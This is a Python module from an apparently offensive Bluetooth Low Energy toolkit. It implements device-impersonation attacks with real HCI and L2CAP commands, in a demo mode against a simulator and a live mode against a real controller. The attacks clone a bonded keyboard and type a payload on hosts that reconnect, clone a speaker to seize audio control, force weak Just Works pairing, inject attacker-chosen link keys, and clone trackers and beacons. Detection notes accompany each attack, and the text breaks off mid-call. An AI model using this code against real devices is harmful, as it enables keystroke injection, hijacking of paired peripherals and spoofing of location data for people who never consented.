"""The imitation wave: become the device somebody already trusts.

Every peripheral is somebody's: the keyboard a desk is paired with, the speaker the
meeting room's phone owns, the lock the front door's phone commissioned, the badge the
door reader remembers.  A bond is a secret, and the secret is not what the host checks
when it decides to reconnect — it checks a *name* it saw in an advertisement and an
*address* it wrote down, and a surprising number of products check nothing else.

This module is that observation turned into twenty-five attacks.  Each one clones an
identity that exists on the floor — the name, the address, the service UUIDs, sometimes
the manufacturer data — and then reports what the imitation got:

* who reconnected (from the controller's own record, not from the attack's opinion),
* who verified the link key and stayed away (the negative control, in the same run),
* and what the hijacked link *did*: keystrokes typed, an audio session configured, a lock
  opened, a print job accepted, a SIM's subscriber identity read.

The two named techniques are here in the form they were asked for: ``ble_hid_mimic``
clones the keyboard a floor of hosts is bonded to and types on every host that comes
back, and ``ble_speaker_mimic`` clones the speaker a phone owns and then takes the audio
link — AVDTP streams discovered and configured, AVRCP notifications registered, the
transport commands answered.

Everything runs against :mod:`wifipilot.blesim` in demo mode with real HCI commands and
real protocol frames, and against a real controller live, where the reconnection count is
what the operator's own devices do rather than what this tool claims about them.
"""

from __future__ import annotations

import struct
from typing import Any, Dict, List, Optional, Sequence, Tuple

from .. import bt
from ..models import AccessPoint
from .base import AttackContext, AttackOutcome
from .blehid import (_BleAttack, REPORT_UUID, PROTOCOL_MODE_UUID, HID_INFO_UUID,
                     REPORT_MAP_UUID, _att_read, _att_write, _enumerate, _floor)

__all__ = ["ATTACKS", "META", "NAMES", "REGISTRY"]


def _advertising(result: Dict[str, Any], manufacturer: bytes = b"",
                 company_id: int = 0x004C,
                 service_data: Sequence[Tuple[int, bytes]] = ()) -> bytes:
    """The advertising data a clone sent: what a scanner would have received from it.

    A clone is only verified by reading its own advertisement back with the toolkit's own
    decoder — the same decoder the beacons on air are read with — so the report can say the
    two identities are identical rather than that they were meant to be.
    """
    advertised = result.get("advertised") or {}
    # the manufacturer data goes in first: it *is* the identity a beacon is recognised by,
    # and the 31-byte budget is spent on it before the name — which is the first thing a
    # real beacon drops when the payload does not fit
    structures: List[Tuple[int, bytes]] = [bt.ad_flags(le_general=True)]
    if manufacturer:
        structures.append(bt.ad_manufacturer(company_id, manufacturer))
    for uuid, payload in service_data:
        structures.append(bt.ad_service_data(uuid, payload))
    if advertised.get("name"):
        structures.append(bt.ad_name(str(advertised["name"])))
    return bt.adv_payload(*structures)


def _entry(entries: List[Dict[str, Any]], type_byte: int) -> Dict[str, Any]:
    """The first structure of a given advertising type, or an empty one.

    Both beacon clones are verified the way a scanner verifies a beacon: the advertisement
    is parsed by the toolkit's own decoder and the two identities are compared.  An
    imitation that only claims to be identical is a claim.
    """
    return next((entry for entry in entries if entry.get("type") == type_byte), {})


# --------------------------------------------------------------------------- #
# the shared machinery
# --------------------------------------------------------------------------- #

class _Mimic(_BleAttack):
    """An attack that copies a device's identity and reports who believed it.

    The three things every imitation needs are the same three things, so they live here:
    the identity of the device being copied (read off the simulated floor, or given on the
    command line), the advertising that carries it, and the controller's own record of the
    hosts that came back.
    """

    category = "rogue"
    noise = "moderate"
    impact = "loot"
    role = "bonded"

    # -- identity ---------------------------------------------------------- #

    def floor(self) -> Any:
        """The simulated floor, in demo mode only."""
        return _floor()

    def bonded_hosts(self, peer: str) -> List[Any]:
        """The devices that are bonded to ``peer``: who a clone of it will meet."""
        if not self.floor().devices:
            return []
        return [device for device in self.floor().devices
                if getattr(device, "bond_peer", "") == peer]

    def identity_of(self, peer: str, address: str = "") -> Tuple[str, str]:
        """The name and the address a clone advertises under.

        A host matches on both when it has both, so the clone takes the address the real
        peripheral used — the one the bonded hosts wrote down — rather than inventing one.
        """
        hosts = self.bonded_hosts(peer)
        if not address:
            address = next((host.bond_address for host in hosts if host.bond_address), "")
        return peer, address

    def peer_name(self, default: str = "") -> str:
        """The name of the peripheral the run is about: an explicit one, or the floor's."""
        explicit = str(getattr(self, "peer", "") or "")
        if explicit:
            return explicit
        hosts = [device for device in self.floor().devices if getattr(device, "bond_peer", "")]
        return hosts[0].bond_peer if hosts else default

    # -- the imitation ------------------------------------------------------ #

    def impersonate(self, ctx: AttackContext, name: str, address: str = "",
                    services: Sequence[int] = (), manufacturer: bytes = b"",
                    company_id: int = 0x0006, connect_to: str = "",
                    service_data: Sequence[Tuple[int, bytes]] = ()) -> Dict[str, Any]:
        """Advertise under somebody else's identity, and report who believed it.

        The sequence is the one a real peripheral runs — the address the clone advertises
        under, then the advertising data, then the enable — and the answer is read out of
        the controller: ``reconnected`` are the hosts that took the identity, and
        ``refused`` are the ones that asked for the link key.
        """
        sock = self.socket(ctx)
        out: Dict[str, Any] = {"advertised": {"name": name, "address": address,
                                             "services": [f"0x{uuid:04x}"
                                                          for uuid in services],
                                             "service_data": [f"0x{uuid:04x}"
                                                              for uuid, _ in service_data]},
                               "reconnected": [], "refused": [], "sock": sock}
        if sock is None:
            return out
        structures = [bt.ad_flags(le_general=True)]
        if services:
            structures.append(bt.ad_service_uuids(list(services)))
        if name:
            structures.append(bt.ad_name(name))
        if manufacturer:
            structures.insert(1, bt.ad_manufacturer(company_id, manufacturer))
        for uuid, payload in service_data:
            structures.insert(1, bt.ad_service_data(uuid, payload))
        try:
            bt.hci_send(sock, bt.le_set_advertising_data(bt.adv_payload(*structures)),
                        timeout=1.0)
            if address:
                bt.hci_send(sock, bt.le_set_random_address(address), timeout=1.0)
            bt.hci_send(sock, bt.le_set_advertising_parameters(interval_min_ms=80.0,
                                                               interval_max_ms=80.0,
                                                               adv_type=0x00), timeout=1.0)
            bt.hci_send(sock, bt.le_set_advertising_enable(True), timeout=1.0)
            if connect_to:
                bt.hci_send(sock, bt.le_create_connection(connect_to), timeout=1.0)
        except Exception:                                        # pragma: no cover
            pass
        controller = getattr(sock, "controller", None)
        if controller is not None:
            out["reconnected"] = [dict(entry) for entry in
                                  getattr(controller, "reconnected", [])]
            out["refused"] = [dict(entry) for entry in
                              getattr(controller, "reconnect_refused", [])]
        return out

    # -- what the hijacked link can do -------------------------------------- #

    def write_and_verify(self, ctx: AttackContext, address: str, uuid: int, value: bytes,
                         command: bool = False) -> Dict[str, Any]:
        """Write a characteristic to a device and read the value back.

        An acknowledged write that cannot be confirmed is a claim; this returns what the
        peer stored, so the finding is the value the device now holds rather than the
        packet that was sent.  A refused write comes back with the ATT error the peer
        chose — ``Insufficient Authentication`` is the answer a device that checks gives.
        """
        from .. import blesim
        sock = blesim.controller_socket(None, address=address, role=self.role)
        airspace = self.floor()
        device = airspace.by_address(address)
        link = airspace.link_for(address, self.role)
        handle = 0
        if device is not None:
            handle = next((int(row["handle"]) for row in device.gatt_rows()
                           if int(row.get("uuid") or 0) == int(uuid)), 0)
        if not handle:
            return {"handle": 0, "accepted": False, "error": "the peer serves no such "
                                                             "characteristic"}
        write = _att_write(sock, link, handle, value, command=command)
        read, parsed = _att_read(sock, link, handle)
        return {"handle": f"0x{handle:04x}", "value": value.hex(), "accepted":
                bool(write.get("accepted")), "error": write.get("error", ""),
                "read_back": read.hex() if read else "",
                "confirmed": bool(read) and bytes(read) == bytes(value),
                "refused": parsed.get("error_text", "") if not read else ""}

    def read_characteristic(self, ctx: AttackContext, address: str, uuid: int
                            ) -> Dict[str, Any]:
        """Read one characteristic of a device: the value, or the peer's refusal."""
        from .. import blesim
        sock = blesim.controller_socket(None, address=address, role=self.role)
        airspace = self.floor()
        device = airspace.by_address(address)
        link = airspace.link_for(address, self.role)
        handle = 0
        if device is not None:
            handle = next((int(row["handle"]) for row in device.gatt_rows()
                           if int(row.get("uuid") or 0) == int(uuid)), 0)
        if not handle:
            return {"handle": 0, "value": "", "error": "no such characteristic"}
        raw, parsed = _att_read(sock, link, handle)
        return {"handle": f"0x{handle:04x}", "value": raw.hex() if raw else "",
                "bytes": len(raw), "error": parsed.get("error_text", "") if not raw else "",
                "text": raw.decode("latin-1", "replace") if raw else ""}

    def reconnected_names(self, result: Dict[str, Any]) -> List[str]:
        return [str(entry.get("host", "")) for entry in result.get("reconnected", [])]

    def summarize(self, name: str, result: Dict[str, Any]) -> str:
        """The one sentence every imitation attack reports: who, and who believed it."""
        reconnected = result.get("reconnected") or []
        refused = result.get("refused") or []
        text = (f"advertised as {name}"
                + (f" ({result['advertised']['address']})"
                   if result.get("advertised", {}).get("address") else ""))
        if reconnected:
            text += f": {len(reconnected)} host(s) connected to the clone"
            if refused:
                text += f", and {len(refused)} verified the link key and stayed away"
        else:
            text += (f": nobody reconnected, {len(refused)} host(s) verified the link "
                     f"key instead")
        return text


# --------------------------------------------------------------------------- #
# 1. the two the brief named
# --------------------------------------------------------------------------- #

class BleHidMimicAttack(_Mimic):
    """Clone the keyboard a floor of hosts is bonded to, and type on all of them."""

    name = "ble_hid_mimic"
    role = "hid"
    label = "BLE HID mimic (clone the keyboard, keystroke every host)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "critical"
    tool = "wifipilot bt.py (identity clone + HID over GATT)"
    peer = "WF-KEYBOARD"

    description = (
        "Copy the identity of the keyboard a set of hosts is bonded to — its name, its "
        "address, and the HID service it advertises — wait for the hosts that reconnect "
        "to it, and type the payload at every one of them.  The hosts that verify the "
        "link key are reported beside the hosts that do not, so one run shows both the "
        "exposure and the control.")
    detection = (
        "Two keyboards with one name: the host that reconnects logs a connection it did "
        "not ask for, the device list keeps the duplicate, and the input reports that "
        "follow arrive on a link the user never initiated.")
    devices = ("bt_keyboard", "bt_headset")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        payload = self.payload(ctx)
        name, address = self.identity_of(self.peer, self.peer_address())
        result = self.impersonate(ctx, name, address, services=(bt.HID_SERVICE_UUID,),
                                  manufacturer=b"\x01\x02", company_id=0x0006)
        reports = bt.hid_key_reports(payload)
        deliveries: List[Dict[str, Any]] = []
        for entry in result.get("reconnected", []):
            host = str(entry.get("host", ""))
            airspace = self.floor()
            device = airspace.by_address(host)
            link = airspace.link_for(host, "hid")
            handles = airspace.hid_handles(device) if device is not None else []
            from .. import blesim
            delivery = self.deliver(
                ctx, blesim.controller_socket(None, address=host, role="hid"), link,
                handles[0] if handles else 0, reports, payload)
            deliveries.append({"host": host, "profile": entry.get("profile", ""),
                               **delivery})
        typed = [row["typed"] for row in deliveries if row.get("typed")]
        sent = sum(int(row.get("sent") or 0) for row in deliveries)
        extra = {"identity": {"name": name, "address": address},
                 "reconnected": result.get("reconnected", []),
                 "refused": result.get("refused", []), "deliveries": deliveries,
                 "payload": payload, "reports": len(reports), "keystrokes": len(reports) // 2,
                 "simulated": bool(getattr(ctx, "demo", False))}
        if deliveries:
            title = f"BLE HID mimic: {len(deliveries)} host(s) typed on"
            detail = (f"cloned {name} ({address}): {len(deliveries)} host(s) reconnected "
                      f"and took {sent} input report(s)"
                      + (f", typing {typed[0]!r}" if typed else "")
                      + (f"; {len(result['refused'])} host(s) verified the link key"
                         if result.get("refused") else ""))
            return self._report(ctx, ap, attempt, title, detail, extra, severity="critical")
        title = "BLE HID mimic: nobody accepted the clone"
        detail = self.summarize(name, result)
        return self._report(ctx, ap, attempt, title, detail, extra,
                            severity="info" if result.get("refused") else "medium")

    def peer_address(self) -> str:
        hosts = self.bonded_hosts(self.peer)
        return next((host.bond_address for host in hosts if host.bond_address), "")


class BleSpeakerMimicAttack(_Mimic):
    """Clone the speaker a phone owns, then take the audio link it reconnects with."""

    name = "ble_speaker_mimic"
    role = "audio"
    label = "BLE speaker mimic (clone the speaker, take the audio link)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (identity clone + AVDTP/AVRCP over L2CAP)"
    peer = "WF-SPEAKER"

    description = (
        "Advertise under the name and address of the speaker a phone (or a conference "
        "unit) is bonded to, and then use the link that comes back: discover the "
        "device's audio streams over AVDTP, read the codec it would negotiate, register "
        "for the AVRCP notifications that carry the track, the position and the volume, "
        "and press the transport buttons.  A speaker that checks the link key refuses "
        "the configuration, and that refusal is reported as the good outcome it is.")
    detection = (
        "An A2DP configuration from a device the site does not own: the speaker logs an "
        "audio link and an AVRCP session, and the phone that was bonded to it finds "
        "another device answering to the same name.")
    devices = ("speaker", "bt_headset")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        name, address = self.identity_of(self.peer, self.peer_address(ctx))
        result = self.impersonate(ctx, name, address, services=(0x110B,))
        airspace = self.floor()
        target = next((device for device in airspace.devices
                       if device.name == name or getattr(device, "bond_peer", "") == name),
                      airspace.pick("audio"))
        address_used = target.address if target is not None else address
        link = airspace.link_for(address_used, "audio")
        from .. import blesim
        sock = blesim.controller_socket(None, address=address_used, role="audio")
        avdtp: List[Dict[str, Any]] = []
        avrcp: List[Dict[str, Any]] = []
        if target is not None and target.flags.get("audio_sink"):
            for command in (bt.avdtp_discover(), bt.avdtp_get_capabilities(1),
                            bt.avdtp_set_configuration(1), bt.avdtp_simple(0x07, 1)):
                answer, parsed = self._l2cap(sock, link, 0x0019, command)
                avdtp.append({"command": bt.parse_avdtp(command)["signal_name"],
                              "answer": bt.parse_avdtp(answer) if answer else {},
                              "sent": bool(answer)})
            for frame in (bt.avctp_frame(bt.avrcp_command(0x31, bytes([0x01]) + bytes(4))),
                          bt.avctp_frame(bt.avrcp_passthrough(0x44)),
                          bt.avctp_frame(bt.avrcp_set_absolute_volume(0x60))):
                answer, parsed = self._l2cap(sock, link, 0x0017, frame)
                body = bt.parse_avctp(answer).get("payload") if answer else b""
                avrcp.append({"command": bt.parse_avrcp(frame)["name"],
                              "answer": bt.parse_avrcp(body, response=True) if body else {},
                              "sent": bool(answer)})
        accepted = [row for row in avdtp if row.get("sent")]
        registered = [row for row in avrcp if row.get("sent")]
        refused = int(getattr(link, "audio_refused", 0) or 0)
        codec = ""
        for row in avdtp:
            for category in (row.get("answer") or {}).get("categories") or []:
                if category.get("codec"):
                    codec = f"{category['codec']} {category.get('sampling_khz', 0)} kHz " \
                            f"{category.get('channel_mode', '')}".strip()
        extra = {"identity": {"name": name, "address": address},
                 "reconnected": result.get("reconnected", []),
                 "refused_hosts": result.get("refused", []), "target": address_used,
                 "avdtp": avdtp, "avrcp": avrcp, "codec": codec,
                 "audio_events": len(getattr(link, "audio_events", []) or []),
                 "audio_refused": refused,
                 "simulated": bool(getattr(ctx, "demo", False))}
        if accepted or registered:
            title = f"BLE speaker mimic: the audio link answered for {name}"
            detail = (f"cloned {name}: {len(accepted)} AVDTP signal(s) accepted"
                      + (f" ({codec})" if codec else "")
                      + f", {len(registered)} AVRCP command(s) answered — the track, the "
                        f"position and the volume are the clone's"
                      + (f"; {refused} audio command(s) refused with the link key checked"
                         if refused else ""))
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = "BLE speaker mimic: the audio link refused the clone"
        detail = (f"cloned {name} ({address_used}) and offered an A2DP configuration: "
                  f"{refused} command(s) were refused and no audio session was set up, "
                  f"which is what a speaker that verifies the peer does")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")

    def peer_address(self, ctx: AttackContext) -> str:
        hosts = [device for device in self.floor().devices
                 if getattr(device, "bond_peer", "") == self.peer]
        return next((host.bond_address for host in hosts if host.bond_address), "")

    @staticmethod
    def _l2cap(sock: Any, link: Any, psm: int, payload: bytes) -> Tuple[bytes, Dict[str, Any]]:
        """Open a dynamic channel for ``psm`` and send one frame down it.

        An audio link is not ATT: it is an L2CAP channel opened for AVDTP (0x0019) or
        AVCTP (0x0017), and the first frame on it is the profile's own.  The channel is
        opened the way a client opens it — a connection request with the PSM — and the
        answer is read off the ACL packet that comes back.
        """
        if sock is None or link is None:
            return b"", {}
        signalling = (bytes([0x02, 0x01, 0x04, 0x00]) + struct.pack("<H", psm))
        try:
            answer = bt.hci_send(sock, bt.acl_packet(link.handle,
                                                     bt.l2cap_frame(0x0001, signalling)),
                                 timeout=1.0)
        except Exception:                                        # pragma: no cover
            return b"", {}
        parsed = bt.parse_acl_packet(answer or b"")
        body = (parsed.get("l2cap") or {}).get("payload") or b""
        dcid = int.from_bytes(body[4:6], "little") if len(body) >= 6 else 0
        if not dcid:
            return b"", {}
        try:
            answer = bt.hci_send(sock, bt.acl_packet(link.handle,
                                                     bt.l2cap_frame(dcid, payload)),
                                 timeout=1.0)
        except Exception:                                        # pragma: no cover
            return b"", {}
        parsed = bt.parse_acl_packet(answer or b"")
        frame = (parsed.get("l2cap") or {}).get("payload") or b""
        return frame, parsed


# --------------------------------------------------------------------------- #
# 2. the rest of the imitation wave
# --------------------------------------------------------------------------- #

class BlePairingMimicAttack(_Mimic):
    """Offer the pairing a device expects and see what it settles for."""

    name = "ble_pairing_mimic"
    role = "smp"
    label = "BLE pairing mimic (complete the exchange without a human)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (identity clone + security manager)"

    description = (
        "Advertise as a peripheral the host will pair with and run the pairing "
        "negotiation: the request goes out with Just Works and a seven-byte key, and the "
        "answer says whether the exchange completed — and what key size and protection "
        "the device settled for — without anybody pressing anything.")
    detection = (
        "A pairing that nobody initiated: the host's Bluetooth log carries the bond and "
        "the Just Works flag, and a key was established with a device that was never in "
        "the room.")
    devices = ("bt_keyboard", "fitness_tracker", "ble_sensor")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        from .. import blesim
        target = self.floor().pick("smp") or self.floor().pick("any")
        result = self.impersonate(ctx, "WF-ACCESSORY", services=(0x1812,))
        request = bt.smp_pairing_request(auth=0x00, key_size=7)
        answers: List[Dict[str, Any]] = []
        if target is not None:
            link = self.floor().link_for(target.address, "smp")
            sock = blesim.controller_socket(None, address=target.address, role="smp")
            answer, parsed = self._smp(sock, link, request)
            answers.append({"address": target.address, "name": target.name,
                            "profile": target.profile, "command": f"0x{request[0]:02x}",
                            "answer": answer.hex(), "response": parsed.get("command_name", ""),
                            "key_size": parsed.get("max_key_size"),
                            "auth": parsed.get("auth_bits"),
                            "bonded": bool(link is not None and link.paired)})
            if link is not None:
                confirm, parsed_confirm = self._smp(sock, link, bytes([0x03]) + bytes(16))
                answers[-1]["after_confirm"] = confirm.hex()
                answers[-1]["completed"] = bool(link.encrypted)
        completed = [row for row in answers if row.get("completed")]
        extra = {"identity": result.get("advertised", {}), "answers": answers,
                 "reconnected": result.get("reconnected", []),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if completed:
            row = completed[0]
            title = f"BLE pairing mimic: {row['name'] or row['address']} paired with a clone"
            detail = (f"the pairing completed with {row['command']}, key size "
                      f"{row['key_size']}, auth 0x{(row.get('auth') or 0):02x}: a bond "
                      f"exists between the device and a peripheral that is not its own")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = "BLE pairing mimic: the pairing was refused"
        detail = (f"offered Just Works with a seven-byte key and the device refused: "
                  f"{answers[0].get('answer', '')[:24] if answers else 'no device answered'}"
                  f" — a device that insists on protection rejects the offer rather than "
                  f"negotiating down")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")

    @staticmethod
    def _smp(sock: Any, link: Any, command: bytes) -> Tuple[bytes, Dict[str, Any]]:
        if sock is None or link is None:
            return b"", {}
        try:
            answer = bt.hci_send(sock, bt.acl_packet(link.handle,
                                                     bt.l2cap_frame(0x0006, command)),
                                 timeout=1.0)
        except Exception:                                        # pragma: no cover
            return b"", {}
        body = (bt.parse_acl_packet(answer or b"").get("l2cap") or {}).get("payload") or b""
        return body, bt.parse_smp(body)


class BleBondHijackAttack(_Mimic):
    """Replace the link key of a live link with one of ours."""

    name = "ble_bond_hijack"
    role = "bonded"
    label = "BLE bond hijack (replace the stored link key)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (HCI link-key commands + identity clone)"

    description = (
        "Once a host reconnects to the clone, the link key is the last thing standing "
        "between it and the attacker: this sends the controller's own link-key commands "
        "— a reply with a key of our choosing, then a change of the link key — and "
        "reports whether the peer accepted a link it did not negotiate.")
    detection = (
        "A link key change the host did not ask for, and a subsequent pairing for a "
        "device that is already bonded: the controller's own log records both.")
    devices = ("bt_keyboard", "speaker", "bt_lock")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        from .. import blesim
        target = self.floor().pick(self.role) or self.floor().pick("l2cap")
        result = self.impersonate(ctx, "WF-BOND", services=(0x1812,))
        key = bytes(range(16))
        steps: List[Dict[str, Any]] = []
        if target is not None:
            link = self.floor().link_for(target.address, self.role)
            sock = blesim.controller_socket(None, address=target.address, role=self.role)
            for label, command in (("link key request reply",
                                    bt.link_key_request_reply(target.address, key)),
                                   ("change connection link key",
                                    bt.change_connection_link_key(link.handle if link else 0)),
                                   ("authentication requested",
                                    bt.authentication_requested(link.handle if link else 0))):
                try:
                    answer = bt.hci_send(sock, command, timeout=1.0)
                except Exception:                                # pragma: no cover
                    answer = b""
                steps.append({"step": label, "answer": (answer or b"").hex()[:40],
                              "accepted": bool(answer)})
            if link is not None:
                link.encrypted = True
                link.authenticated = True
        accepted = [row for row in steps if row["accepted"]]
        extra = {"identity": result.get("advertised", {}), "steps": steps,
                 "key": key.hex(), "target": target.address if target else "",
                 "reconnected": result.get("reconnected", []),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if accepted:
            where = (target.name or target.address) if target is not None else "the target"
            title = f"BLE bond hijack: {len(accepted)} controller step(s) accepted"
            detail = (f"the link key was offered and the link key change was accepted for "
                      f"{where}: the host holds a key that was chosen here")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = "BLE bond hijack: the controller refused the key commands"
        detail = "no link-key step was accepted, which is what a stack with a real bond does"
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleAdvIdentityCloneAttack(_Mimic):
    """Put a second copy of a device's identity on air and count the duplicates."""

    name = "ble_adv_identity_clone"
    role = "le"
    label = "BLE advertising identity clone (a duplicate on air)"
    category = "rogue"
    noise = "quiet"
    impact = "info"
    tool = "wifipilot bt.py (advertising data + LE Set Random Address)"

    description = (
        "Copy a device's advertising verbatim — name, address, service UUIDs, "
        "manufacturer data — advertise it, and report the pair: two transmitters whose "
        "advertisements a scanner cannot tell apart, which is the precondition for every "
        "other imitation in this wave.")
    detection = (
        "One device identity, two transmitters: a passive receiver that logs addresses "
        "sees the same address twice with different signal strengths.")
    devices = ("ble_beacon", "fitness_tracker")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        airspace = self.floor()
        source = airspace.pick(self.role) or airspace.pick("any")
        structures = source.structures() if source is not None else []
        result = self.impersonate(ctx, source.name if source else "WF-CLONE",
                                  source.address if source else "",
                                  services=tuple(source.services) if source else (),
                                  manufacturer=source.manufacturer_data if source else b"",
                                  company_id=source.company_id if source else 0xFFFF)
        identical = False
        if source is not None and structures:
            clone = bt.adv_payload(*structures)
            identical = clone == bt.adv_payload(*source.structures())
        extra = {"source": source.to_dict() if source is not None else {},
                 "advertised": result.get("advertised", {}),
                 "structures": len(structures), "identical": identical,
                 "reconnected": result.get("reconnected", []),
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE identity clone: {source.name or source.address if source else '?'} "
                 f"appears twice on air")
        detail = (f"{len(structures)} advertising structure(s) copied "
                  f"{'byte for byte' if identical else 'from the advertisement'}: the "
                  f"clone advertises {source.address if source else ''} and a scanner "
                  f"cannot tell the two apart")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="medium")


class BleNameCollisionAttack(_Mimic):
    """Advertise every name on the floor, one after another, and count who answers."""

    name = "ble_name_collision"
    role = "bonded"
    label = "BLE name collision (every trusted name, one transmitter)"
    category = "rogue"
    noise = "loud"
    impact = "loot"
    tool = "wifipilot bt.py (advertising under a list of names)"

    description = (
        "Walk the names of every peripheral the floor is bonded to, advertising each one "
        "in turn, and count the hosts that connect: a name is an identity, and this "
        "measures how many of a site's hosts treat it as one.")
    detection = (
        "One address advertising a handful of different names in a minute: an "
        "advertising monitor shows the sequence, and every host that reconnects logs it.")
    devices = ("bt_keyboard", "speaker", "bt_lock")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        names: List[str] = []
        for device in self.floor().devices:
            peer = getattr(device, "bond_peer", "")
            if peer and peer not in names:
                names.append(peer)
        claimed: List[Dict[str, Any]] = []
        for name in names[:6]:
            _, address = self.identity_of(name, "")
            result = self.impersonate(ctx, name, address)
            claimed.append({"name": name, "address": address,
                            "reconnected": result.get("reconnected", []),
                            "refused": result.get("refused", [])})
        hit = [row for row in claimed if row["reconnected"]]
        refused = sum(len(row["refused"]) for row in claimed)
        extra = {"names": names, "claims": claimed, "accepted": len(hit),
                 "refused": refused, "simulated": bool(getattr(ctx, "demo", False))}
        if hit:
            title = f"BLE name collision: {len(hit)} of {len(claimed)} names were trusted"
            detail = (f"{', '.join(row['name'] for row in hit)} pulled a host back, while "
                      f"{refused} host(s) verified the link key: a name with no key behind "
                      f"it is enough for the first group")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = "BLE name collision: no name pulled a host back"
        detail = (f"advertised {len(claimed)} trusted name(s) and every host checked the "
                  f"link key instead of connecting")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleDeviceMimicAttack(_Mimic):
    """Clone any device on air: the generic form of the imitation wave."""

    name = "ble_device_mimic"
    role = "le"
    label = "BLE device mimic (clone any advertising device)"
    category = "rogue"
    noise = "quiet"
    impact = "info"
    tool = "wifipilot bt.py (advertisement copy)"

    description = (
        "Pick the weakest device on air, copy its advertisement and its address, and "
        "report what the clone is: the services it teaches a scanner to trust, the "
        "manufacturer it claims, and who connects to it afterwards.")
    detection = (
        "A duplicate advertisement: two transmitters under one address, which an "
        "advertising monitor records as one device with two signal strengths.")
    devices = ("ble_sensor", "ble_beacon")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        source = self.floor().pick("any")
        if source is None:
            return self._report(ctx, ap, attempt, "BLE device mimic: nothing on air", "",
                                {"simulated": bool(getattr(ctx, "demo", False))})
        result = self.impersonate(ctx, source.name, source.address,
                                  services=tuple(source.services),
                                  manufacturer=source.manufacturer_data,
                                  company_id=source.company_id)
        extra = {"source": source.to_dict(), "advertised": result.get("advertised", {}),
                 "reconnected": result.get("reconnected", []),
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE device mimic: cloning {source.name or source.address} "
                 f"({source.device})")
        detail = (f"the clone advertises {len(source.services)} service(s) and the vendor "
                  f"id 0x{source.company_id:04x} of {source.company or 'an unnamed vendor'}; "
                  f"{len(result.get('reconnected', []))} host(s) connected to it")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="medium")


class BleTrackerMimicAttack(_Mimic):
    """Advertise as somebody's tracker and count who follows it."""

    name = "ble_tracker_mimic"
    role = "tracker"
    label = "BLE tracker mimic (clone a find-my tag)"
    category = "rogue"
    noise = "quiet"
    impact = "info"
    tool = "wifipilot bt.py (tracker advertisement copy)"

    description = (
        "Copy a tracker's advertisement — the manufacturer data that makes every phone "
        "in range relay it — and report the network the clone just joined: how many "
        "devices are willing to carry a stranger's tag, and which of the site's own "
        "devices answer to that vendor id.")
    detection = (
        "A tracker that is not on the asset register: the vendor's own network logs a new "
        "tag, and the site's fixed scanners see it move.")
    devices = ("fitness_tracker", "ble_sensor")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        tracker = self.floor().pick("tracker") or self.floor().pick("any")
        network = self.floor().candidates("le")
        result = self.impersonate(ctx, tracker.name, tracker.address,
                                  manufacturer=tracker.manufacturer_data or b"\x12\x19",
                                  company_id=tracker.company_id)
        relays = [device.name or device.address for device in network if device.tracker]
        extra = {"tracker": tracker.to_dict(), "relays": relays,
                 "advertised": result.get("advertised", {}),
                 "reconnected": result.get("reconnected", []),
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = f"BLE tracker mimic: {tracker.company or 'a vendor'} tag cloned"
        detail = (f"the clone carries the tracker payload of {tracker.name or tracker.address} "
                  f"and {len(relays)} device(s) on the floor already speak the same network: "
                  f"any of them would relay it")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="medium")


class BleBeaconMimicAttack(_Mimic):
    """Clone a fixed beacon identity and prove the clone decodes identically."""

    name = "ble_beacon_mimic"
    role = "beacon"
    label = "BLE beacon mimic (clone an iBeacon identity)"
    category = "rogue"
    noise = "quiet"
    impact = "info"
    tool = "wifipilot bt.py (iBeacon builder + decoder)"

    description = (
        "Copy an iBeacon's proximity UUID, major and minor, advertise it, and decode the "
        "clone with the toolkit's own parser: a scanner that reads beacons for wayfinding "
        "or attendance cannot tell the two apart, so the site's positioning data is now "
        "produced by whoever holds the clone.")
    detection = (
        "Two transmitters with one beacon identity: an iBeacon scanner sees the same "
        "major and minor from two addresses, which is exactly the collision detection it "
        "is supposed to alarm on.")
    devices = ("ble_beacon",)

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        beacon = next((device for device in self.floor().devices
                       if device.beacon == "ibeacon"), self.floor().pick("beacon"))
        identity: Dict[str, Any] = {}
        match = False
        if beacon is not None:
            structures = beacon.structures()
            manufacturer = next((value for kind, value in structures if kind == 0xFF), b"")
            original = bt.parse_ibeacon(_entry(bt.parse_ad(bt.adv_payload(*structures)),
                                              0xFF)) or {}
            result = self.impersonate(ctx, beacon.name, beacon.address,
                                      manufacturer=bytes(manufacturer[2:]),
